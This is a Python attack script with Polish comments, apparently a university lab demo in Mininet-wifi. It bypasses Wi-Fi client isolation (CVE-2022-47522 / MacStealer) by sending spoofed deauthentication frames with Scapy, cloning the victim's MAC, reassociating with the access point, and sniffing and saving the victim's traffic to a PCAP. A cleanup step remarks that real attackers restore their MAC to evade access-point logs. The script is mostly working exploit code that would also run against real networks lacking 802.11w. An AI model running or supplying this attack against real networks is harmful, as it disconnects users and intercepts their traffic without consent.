#!/usr/bin/env python3
"""
BBSK Projekt - Atak: MAC Spoofing + Association Hijacking
Ominięcie Client Isolation (CVE-2022-47522 / MacStealer / AirSnitch Port Stealing)

Uruchomienie (z CLI Mininet-wifi):
    mininet-wifi> sta2 python3 /home/kali/bbsk-projekt/attack.py
    mininet-wifi> sta2 python3 /home/kali/bbsk-projekt/attack.py --demo   # tryb prezentacji

Kroki ataku:
    1. Odczyt MAC ofiary i konfiguracji
    2. Wysłanie ramek Deauthentication - rozłączenie ofiary
    3. Podmiana MAC atakującego na MAC ofiary
    4. Ponowna asocjacja z AP używając własnych danych ale MAC ofiary
    5. Weryfikacja: ruch przeznaczony dla ofiary trafia do atakującego
"""

import subprocess
import time
import os
import sys


DEMO_MODE = '--demo' in sys.argv


try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, IP
    SCAPY_OK = True
except ImportError:
    print("[!] Scapy niedostępne")
    SCAPY_OK = False




def pause(msg=""):
    """W trybie demo: czeka na Enter przed przejściem do kolejnego kroku."""
    if DEMO_MODE:
        input(f"\n  [ENTER aby kontynuować{': ' + msg if msg else ''}] ")

def step_banner(num, title, explanation=""):
    """Wypisuje nagłówek kroku — widoczny i czytelny na projektorze."""
    print(f"\n{'='*58}")
    print(f"  KROK {num}: {title}")
    if explanation:
        print(f"  {'─'*50}")
        print(f"  {explanation}")
    print(f"{'='*58}")

def run(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def get_mac(iface):
    r = subprocess.run(['cat', f'/sys/class/net/{iface}/address'],
                       capture_output=True, text=True)
    return r.stdout.strip()

def read_config(path='/tmp/bbsk_config.txt'):
    config = {}
    try:
        with open(path) as f:
            for line in f:
                k, v = line.strip().split('=', 1)
                config[k] = v
    except FileNotFoundError:
        print(f"[!] Brak {path} — uruchom najpierw topology.py")
        sys.exit(1)
    return config



print("\n" + "█"*58)
print("  BBSK — MAC Spoofing + Association Hijacking")
print("  CVE-2022-47522 / AirSnitch Port Stealing")
print("█"*58)

if DEMO_MODE:
    print("\n  TRYB PREZENTACJI — każdy krok wymaga naciśnięcia ENTER")
    print("  Możesz tłumaczyć co się dzieje zanim przejdziesz dalej.")

step_banner(1, "Odczyt konfiguracji sieci",
    "Pobieramy adresy MAC ofiary i AP. W prawdziwym ataku\n"
    "  atakujący odczytuje MAC ofiary z ramek Wi-Fi (Wireshark/airodump).")

cfg = read_config()
VICTIM_MAC  = cfg['VICTIM_MAC']
VICTIM_IP   = cfg['VICTIM_IP']
AP_MAC      = cfg['AP_MAC']
ATT_IFACE   = cfg.get('ATTACKER_IFACE', 'sta2-wlan0')

ORIGINAL_ATT_MAC = get_mac(ATT_IFACE)

print(f"\n  Ofiara  MAC : {VICTIM_MAC}   IP: {VICTIM_IP}")
print(f"  AP      MAC : {AP_MAC}")
print(f"  Atakujący   : {ORIGINAL_ATT_MAC}  (oryginalny MAC)")

os.makedirs('/home/kali/bbsk-projekt/logs', exist_ok=True)
LOG = '/home/kali/bbsk-projekt/logs/attack.log'
with open(LOG, 'w') as f:
    f.write(f"VICTIM_MAC={VICTIM_MAC}\nVICTIM_IP={VICTIM_IP}\n"
            f"AP_MAC={AP_MAC}\nATTACKER_MAC={ORIGINAL_ATT_MAC}\n\n")

pause("wiemy kogo atakujemy")



step_banner(2, "Baseline — izolacja PRZED atakiem",
    "Sprawdzamy, że Client Isolation działa poprawnie:\n"
    "  sta2 (atakujący) NIE może pingować sta1 (ofiary).\n"
    "  Izolacja AP blokuje bezpośrednią komunikację L2.")

print(f"\n  Ping {ATT_IFACE} → {VICTIM_IP} ...")
r = run(f"ping -c 3 -W 1 {VICTIM_IP}")
if r.returncode != 0:
    print("  [✓] Ping zablokowany — izolacja klientów DZIAŁA")
    print("  Bez ataku sta2 nie może dosięgnąć sta1.")
else:
    print("  [!] Ping przeszedł — izolacja może być wyłączona!")

with open(LOG, 'a') as f:
    f.write(f"BASELINE ping sta2→sta1: {'BLOCKED' if r.returncode != 0 else 'PASS'}\n")

pause("izolacja potwierdzona — teraz ją ominą")



step_banner(3, "Deauthentication — rozłączenie ofiary",
    "Wysyłamy ramki 802.11 Deauthentication do AP.\n"
    "  Podszywamy się pod ofiarę (spoofujemy jej MAC w polu addr2).\n"
    "  AP rozłącza ofiarę — przez chwilę MAC 'wisi w powietrzu'.\n"
    "  Bez PMF (802.11w) ramki Deauth są niezabezpieczone!")

if SCAPY_OK:
    print(f"\n  Buduję ramkę Deauth: src={VICTIM_MAC} → dst={AP_MAC}")
    print(f"  Wysyłam 10 ramek przez {ATT_IFACE}...")

    deauth = (
        RadioTap() /
        Dot11(type=0, subtype=12,
              addr1=AP_MAC,   
              addr2=VICTIM_MAC,  
              addr3=AP_MAC) /    
        Dot11Deauth(reason=3)
    )
    sendp(deauth, iface=ATT_IFACE, count=10, inter=0.05, verbose=False)
    print("  [✓] Ramki Deauth wysłane — ofiara rozłączona")
else:
    run(f"hostapd_cli -i ap1-wlan1 deauthenticate {VICTIM_MAC}")
    print("  [✓] Deauth przez hostapd_cli")

with open(LOG, 'a') as f:
    f.write(f"DEAUTH sent to AP {AP_MAC} spoofing {VICTIM_MAC}\n")

time.sleep(1)
pause("ofiara rozłączona — teraz kradniemy MAC")


step_banner(4, "Podmiana adresu MAC",
    "Zmieniamy MAC interfejsu atakującego na MAC ofiary.\n"
    "  W Linux: ip link set <iface> address <MAC>\n"
    "  AP nie weryfikuje czy nowy klient to ta sama osoba co poprzedni.\n"
    "  Autentykacja = hasło/certyfikat. Rutowanie = MAC. To jest luka!")

print(f"\n  Przed: {ATT_IFACE} = {ORIGINAL_ATT_MAC}")
run(f"ip link set {ATT_IFACE} down")
run(f"ip link set {ATT_IFACE} address {VICTIM_MAC}")
run(f"ip link set {ATT_IFACE} up")

new_mac = get_mac(ATT_IFACE)
print(f"  Po:    {ATT_IFACE} = {new_mac}")

if new_mac.lower() == VICTIM_MAC.lower():
    print(f"\n  [✓] MAC zmieniony pomyślnie!")
    print(f"  AP widzi teraz atakującego jako MAC ofiary: {VICTIM_MAC}")
else:
    print(f"  [!] Błąd zmiany MAC")

with open(LOG, 'a') as f:
    f.write(f"MAC changed: {ORIGINAL_ATT_MAC} → {new_mac}\n")

pause("MAC zmieniony — teraz łączymy się z AP jako ofiara")


step_banner(5, "Ponowna asocjacja z AP (z MAC ofiary)",
    "Atakujący łączy się z AP SWOIM hasłem/certyfikatem,\n"
    "  ale z MAC-em ofiary.\n"
    "  AP zapisuje: MAC=<ofiara> → klucze PTK atakującego\n"
    "  Od tej chwili pakiety dla ofiary będą szyfrowane kluczem atakującego!")

run(f"wpa_cli -i {ATT_IFACE} reassociate 2>/dev/null")
time.sleep(2)

assoc = run(f"iw dev {ATT_IFACE} link")
if "Connected" in assoc.stdout:
    print(f"  [✓] Asocjacja z AP udana!")
    bssid_line = [l for l in assoc.stdout.split('\n') if 'Connected' in l]
    if bssid_line:
        print(f"  {bssid_line[0].strip()}")
else:
    print(f"  [~] Sprawdź: iw dev {ATT_IFACE} link")

with open(LOG, 'a') as f:
    f.write(f"REASSOC result: {assoc.stdout[:100]}\n")

pause("asocjacja gotowa — sprawdzamy czy ruch trafia do nas")


step_banner(6, "Weryfikacja — przechwycenie ruchu ofiary",
    "Uruchamiamy sniff na interfejsie atakującego.\n"
    "  Jeśli atak się powiódł: pakiety z h1 → 10.0.0.1 (IP ofiary)\n"
    "  trafią na kartę atakującego.\n"
    "  To naruszenie Client Isolation — PCAP = dowód sądowy.")

captured = []

if SCAPY_OK:
    print(f"\n  Nasłuchuję {ATT_IFACE} przez 8 sekund...")
    print(f"  Przechwytywane pakiety dla IP ofiary ({VICTIM_IP}):\n")

    def show_packet(pkt):
        if IP in pkt and pkt[IP].dst == VICTIM_IP:
            captured.append(pkt)
            print(f"  [>>>] {pkt[IP].src:15} → {pkt[IP].dst:15}  {pkt.summary()}")

    sniff(iface=ATT_IFACE, prn=show_packet, timeout=8,
          filter=f"dst host {VICTIM_IP}")

    print(f"\n  {'─'*50}")
    print(f"  WYNIK: {len(captured)} pakietów przechwyconych dla {VICTIM_IP}")

    if captured:
        print(f"\n  ★★★ ATAK UDANY ★★★")
        print(f"  Client Isolation ominięty!")
        print(f"  Ruch ofiary ({VICTIM_IP}) trafił do atakującego,")
        print(f"  mimo że bezpośredni ping sta1↔sta2 był zablokowany.")
        print(f"\n  Podstawa: AP rutuje po MAC (L2), nie po tożsamości.")
        print(f"  CVE-2022-47522 / AirSnitch Port Stealing")
    else:
        print(f"\n  [~] Brak przechwycenia — sprawdź:")
        print(f"      h1 ping -c 5 {VICTIM_IP}   (wygeneruj ruch)")

with open(LOG, 'a') as f:
    f.write(f"CAPTURED: {len(captured)} packets for {VICTIM_IP}\n")
    f.write(f"RESULT: {'ATTACK SUCCESS' if captured else 'NO CAPTURE'}\n")

pause("wynik ataku pokazany")


step_banner(7, "Zapis PCAP — dowód do raportu",
    "Zapisujemy przechwycone pakiety do pliku .pcap.\n"
    "  Można je otworzyć w Wiresharku i pokazać w raporcie.")

pcap_path = '/home/kali/bbsk-projekt/captures/attack_result.pcap'
if SCAPY_OK and captured:
    from scapy.all import wrpcap
    wrpcap(pcap_path, captured)
    print(f"\n  [✓] PCAP zapisany: {pcap_path}")
    print(f"  Liczba pakietów: {len(captured)}")
    print(f"\n  Otwórz w Wiresharku:")
    print(f"  wireshark {pcap_path}")
else:
    print(f"  [~] Brak pakietów do zapisania")

print(f"\n  Log ataku: {LOG}")

pause("PCAP gotowy")


step_banner(8, "Cleanup — przywrócenie oryginalnego MAC",
    "W prawdziwym ataku atakujący przywraca swój MAC\n"
    "  żeby nie zostawić śladów w logach AP.")

ans = input(f"\n  Przywrócić MAC do {ORIGINAL_ATT_MAC}? [t/n]: ").strip().lower()
if ans in ('t', 'y', 'tak', 'yes', ''):
    run(f"ip link set {ATT_IFACE} down")
    run(f"ip link set {ATT_IFACE} address {ORIGINAL_ATT_MAC}")
    run(f"ip link set {ATT_IFACE} up")
    run(f"wpa_cli -i {ATT_IFACE} reassociate 2>/dev/null")
    print(f"  [✓] MAC przywrócony: {get_mac(ATT_IFACE)}")
else:
    print(f"  MAC pozostaje: {get_mac(ATT_IFACE)}")

print(f"\n{'█'*58}")
print(f"  KONIEC DEMONSTRACJI")
print(f"  Przechwycono {len(captured)} pakietów ofiary")
print(f"  Wyniki: {LOG}")
print(f"  PCAP:   {pcap_path}")
print(f"{'█'*58}\n")
